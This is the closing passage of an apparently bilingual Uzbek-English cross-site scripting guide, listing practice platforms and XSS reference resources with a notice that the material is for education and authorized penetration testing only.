🎯 TryHackMe              — https://tryhackme.com
🎯 PentesterLab           — https://pentesterlab.com
```

### Referans Resurslar / **Reference Resources**

```
📚 OWASP XSS Guide         — https://owasp.org/www-community/attacks/xss/
📚 PortSwigger Cheat Sheet  — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
📚 PayloadsAllTheThings     — https://github.com/swisskyrepo/PayloadsAllTheThings
📚 HackTricks XSS           — https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
📚 XSS Hunter               — https://xsshunter.com
```

---

## ⚖️ Muhim Eslatma / Important Notice

> **Bu ma'lumot faqat ta'lim maqsadida va ruxsat berilgan penetration testing uchun mo'ljallangan.**
>
> **This information is intended solely for educational purposes and authorized penetration testing.**
>
> Ruxsatsiz tizimga hujum qilish ko'plab mamlakatlarda jinoiy javobgarlikka tortiladi.
>
> **Unauthorized attacks on systems are criminal offenses in most countries.**

---

*Made with ❤️ for the security community*
